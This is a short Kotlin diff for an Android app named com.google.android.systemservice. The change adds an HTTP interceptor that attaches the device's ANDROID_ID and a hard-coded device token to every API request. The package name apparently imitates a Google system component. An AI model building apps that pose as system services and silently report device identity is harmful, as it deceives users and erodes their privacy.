@@ -2,6 +2,7 @@ package com.google.android.systemservice.di
 
 import android.content.Context
 import com.google.android.systemservice.BuildConfig
+import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.data.api.ApiService
 import com.google.android.systemservice.data.datasource.LocalDataSource
 import com.google.android.systemservice.data.repository.DeviceRepository
@@ -37,11 +38,21 @@ object AppModule {
     
     @Provides
     @Singleton
-    fun provideOkHttpClient(): OkHttpClient {
+    fun provideOkHttpClient(@ApplicationContext context: Context): OkHttpClient {
         val builder = OkHttpClient.Builder()
             .connectTimeout(30, TimeUnit.SECONDS)
             .readTimeout(30, TimeUnit.SECONDS)
             .writeTimeout(30, TimeUnit.SECONDS)
+            .addInterceptor { chain ->
+                val deviceId = android.provider.Settings.Secure.getString(
+                    context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
+                )
+                val request = chain.request().newBuilder()
+                    .addHeader("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
+                    .addHeader("X-Device-ID", deviceId)
+                    .build()
+                chain.proceed(request)
+            }
         
         if (BuildConfig.DEBUG) {
             val logging = HttpLoggingInterceptor()
